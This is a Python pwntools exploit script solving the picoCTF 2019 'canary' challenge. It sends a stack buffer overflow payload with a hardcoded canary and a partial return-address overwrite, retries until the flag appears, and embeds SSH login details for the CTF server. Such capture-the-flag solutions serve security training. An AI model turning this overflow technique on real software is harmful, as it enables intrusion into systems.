import binascii
from pwn import *
import sys
import time

# python main.py  DEBUG

BINARY = './vuln'
context.terminal = ['tmux', 'splitw', '-h']


def attach_gdb(sh):
    gdb.attach(sh)


def P32(v):
    return struct.pack('I', v)


def P64(v):
    return struct.pack('Q', v)


def deHex(v):
    return binascii.unhexlify(v)[::-1]


def hexPadZero(v):
    return hex(v)[2:].rjust(8, '0')


def start():
    if args["REMOTE"]:
        s = ssh(host='2019shell1.picoctf.com',
                user='mikon',
                password="password")
        sh = s.process(
            'vuln', cwd='/problems/canary_4_221260def5087dde9326fb0649b434a7')
        REMOTE = True
    else:
        sh = process(BINARY, stdout=process.PTY, stdin=process.PTY)

    if args["GDB"]:
        attach_gdb(sh)
    return sh


def main():
    while True:
        sh = start()
        canary = 'LjgH'

        payload = "a" * (0x30 - 0x10)
        payload += canary
        payload += "a" * (0x10 - 4)
        payload += 'a' * 4
        payload += '\xed\x07'

        sh.sendlineafter('>', str(len(payload)))
        sh.sendlineafter('>', payload)

        #advoid fflush(stdout)
        data = sh.recvall(timeout=1)
        if 'pico' in data:
            print(data)
            exit()


if __name__ == '__main__':
    main()
